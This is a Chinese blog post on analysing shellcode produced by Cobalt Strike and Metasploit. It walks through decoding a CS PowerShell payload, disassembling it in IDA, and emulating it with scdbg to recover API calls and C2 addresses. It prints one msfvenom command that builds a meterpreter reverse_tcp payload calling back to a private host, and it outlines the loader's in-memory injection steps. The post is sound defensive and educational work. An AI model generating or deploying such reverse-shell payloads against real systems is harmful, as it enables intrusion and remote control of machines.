---
layout: post
title:  "走进shellcode"
subtitle: '走进shellcode'
date:   2021-12-27 18:00:00
tags: shellcode
description: 'shellcode'
color: 'rgb(255,192,203)'
cover: 'https://a111-1255560786.cos.ap-nanjing.myqcloud.com/20210727001.jpg'
---

# 前言
在做红蓝攻防时，常常要用到cs、msf等工具，使用工具生成shellcode或可执行程序，那么小小的shellcode为何能做这么多事情，拿到shellcode后又该怎么分析。希望这篇文章能给大家带来答案，文章中不正确的地方请及时指出。
# shellcode定义
shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制之机械码，以其经常让攻击者获得shell而得名。shellcode常常使用机器语言编写。 在寄存器eip溢出后，加入一段可让CPU执行的shellcode机械码，让电脑可以执行攻击者的任意指令。  --摘自维基百科

通俗来讲就是一串16进制的机器码，由CPU解释为操作指令 ，最后由内存加载执行。这些操作指令可以由工具生成，也可以自己编写。

例如常见的\x55\x88\xEC，经CPU解释后如下  

55      push ebp  

8B EC   mov ebp, esp  

了解一些汇编知识就能理解，这是一个简单的入栈操作

# shellcode提取
这里以cs生成的powershell代码举例，首先使用Cobalt Strike生成一个powershell的payload。

![image-20211221160111310](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20211221160111310.png)

可以看到使用了base64和xor编码，可以使用CyberChef工具进行解码，解码后转成hex并去除空格

![微信截图_20211221154513](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20211221154513.png)

然后以hex形式黏贴至010editor

![image-20211221160356881](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20211221160356881.png)

# 简单分析
将获取到的文件载入IDA进行简单分析

![ida1](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/ida1.png)

IDA尝试还原代码，但是第一段IDA将其视为了数据段，使用快捷键C来进行转换

![21121702ida2](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/21121702ida2.png)

还原后可以发现，其在第二行调用了sub_8F，另外还要注意fs:[edx+30h],这是一个指向PEB的指针，这是shell代码动态定位和加载所需导入的方式，找到PEB后，就可以去找IAT里相关函数了。

在sub_8F函数内，可以看到如下代码，使用快捷键R可以转换成字符，发现其调用了wininet.dll，这是一个windows应用程序网络相关模块

![20211217100027ida3](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/20211217100027ida3.png)

还有一部分调用我们需要借助于工具匹配windows dll的api哈希值，[完整列表](https://raw.githubusercontent.com/avast/ioc/master/CobaltStrike/api_hashes/win10_api_hashes.txt)

通过检索可以查找到对应调用

0xc69f8957	wininet.dll_InternetConnectA

0xa779563a	wininet.dll_InternetOpenA


# 快速分析
使用IDA分析可以很容易的对shellcode的流程加载进行观察，当然我们可以使用[SCDBG](http://sandsprite.com/blogs/index.php?uid=7&pid=152)工具更快速的对shellcode进行分析。它是一个围绕libemu仿真库构建的shell代码分析应用程序。将向用户显示shellcode试图调用的所有Windows API。

通过命令行直接对文件进行分析，可以快速获取其调用的函数库和远端的地址与端口

![微信截图_20211221095644](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20211221095644.png)

除了命令行，该工具还提供了gui界面，载入文件勾选相关选项，会自动进行分析。

# cs流程分析
通过上面分析我们可以了解到，cs生成的shellcode仅仅加载了wininet API库并导入了两个用于建立互联网连接的库，并可以看到连接对应的IP和端口。其功能也很明显，就是一个接收信号的程序。那么回过头看一下cs生成的ps文件的其他部分



首先，脚本从system.dll 中导入两个函数 GetModuleHandle 和 GetProcAddress，通过动态链接方式直接从内存中导入dll，不会从磁盘加载。

然后，这些函数用于为函数“var_va”分配内存空间，该函数包含我们的 shellcode。然后脚本对 shellcode 进行解码和解密

接下来，VirtualAlloc 将 shellcode 函数写入内存空间以供调用进程使用。因此，shellcode 本质上是注入到进程使用的内存空间中。

最后，shellcode 被执行，在那里它与 Cobalt Strike 服务器建立一个 C2 通道。当通道建立后即可接收来自cs的指令。

# msf流程

首先使用msfvenom生成shellode。

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.245.153 LPORT=4444 -f raw

可惜的是64位的shellcode无法直接使用scdbg进行分析，相对应的一些函数IDA无法做到有效识别，但好在msf生成的shellcode有个特征可以有助于我们去提取IP和端口。

移动指令（mov）且结尾为0002的寄存器值，搜索后找到如下值4199F5A8C05C1120

![微信截图_20211222122806](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20211222122806.png)

这里注意大小端的问题，进行16进制转10进制，可以得到I以下153.245.168.192，转换出来就是192.168.245.153，5c11转换后是4444。一般由于适用性问题，64位的shellode较少，这里简单提一下。

msfvenom的shellcode实现的功能我们可以使用32位的进行分析，将32位的shellcode使用scdbg工具打开，勾选scan for api table选项，最后启动

![image-20211222164620534](https://a111-1255560786.cos.ap-nanjing.myqcloud.com/image-20211222164620534.png)

可以发现其调用的是*ws2_32*.dll，它是Windows Sockets应用程序接口，用于支持Internet和网络应用程序。通过分析可以得出msf的shellcode也仅仅做了建立连接通信的功能。

# 总结

shellcode是一串机器码，可以由CPU解释执行。

cs和msf默认生成的shellcode仅仅是一个连接程序，需要其他方式加载进内存执行。

shellclode分析32位可以直接使用scdbg直接分析，可以获取远程的IP和端口、调用的API等信息。